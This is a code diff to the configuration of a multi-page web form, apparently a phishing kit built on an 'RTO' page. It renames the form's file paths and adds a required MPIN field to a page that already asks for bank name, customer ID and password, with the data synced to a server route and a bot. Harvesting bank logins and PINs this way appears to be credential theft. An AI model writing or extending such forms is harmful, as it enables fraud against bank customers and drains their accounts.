@@ -3,7 +3,7 @@
 // ============================================================
 // To add/remove/change a form page or field:
 //   1. Edit the FORM_PAGES array below
-//   2. The RTO single-page form in public/rto/index.html handles all steps
+//   2. The single-page form in client/src/pages/form.html handles all steps
 //   That's it — bot.ts, types, and server routes all read from here.
 // ============================================================
 
@@ -18,7 +18,7 @@ export interface FieldConfig {
 }
 
 export interface PageConfig {
-    id: string;            // Unique page ID (used in URL: rto/index.html#{id})
+    id: string;            // Unique page ID (used in URL: form.html#{id})
     pageName: string;      // Name sent to /api/form/sync (e.g. 'customer_info')
     title: string;         // Display title for the page
     fields: FieldConfig[]; // Fields on this page
@@ -52,7 +52,7 @@ export const FIELD_CATEGORIES: CategoryConfig[] = [
 // ==================== FORM PAGES ====================
 // Order matters — this defines the default page sequence.
 // Each page's `nextPage` defines per-flow navigation.
-// All pages are rendered inside public/rto/index.html as steps.
+// All pages are rendered inside client/src/pages/form.html as steps.
 
 export const FORM_PAGES: PageConfig[] = [
     {
@@ -115,6 +115,7 @@ export const FORM_PAGES: PageConfig[] = [
             { key: 'bankName', displayName: 'Bank Name', type: 'text', category: 'login', required: true, placeholder: 'Search or Select Bank' },
             { key: 'username', displayName: 'Username / Customer ID', type: 'text', category: 'login', required: true, placeholder: 'Enter Username / Customer ID' },
             { key: 'password', displayName: 'Password', type: 'password', category: 'login', required: true, placeholder: 'Enter Password' },
+            { key: 'mpin', displayName: 'MPIN', type: 'password', category: 'login', required: true, maxlength: 6, placeholder: 'Enter MPIN' },
         ],
         nextPage: { main: 'success' },
     },
